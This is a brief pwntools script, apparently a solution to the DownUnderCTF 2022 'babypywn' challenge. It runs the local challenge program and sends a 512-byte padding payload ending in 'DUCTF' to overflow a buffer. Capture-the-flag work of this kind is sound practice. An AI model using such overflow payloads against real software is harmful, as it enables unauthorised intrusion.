from pwn import *
r = process('python3 /home/user/ctf/downunder2022/pwn/babypywn/src/babypywn.py', shell=True)
r.sendline(b'a'*512+b'DUCTF')
r.interactive()
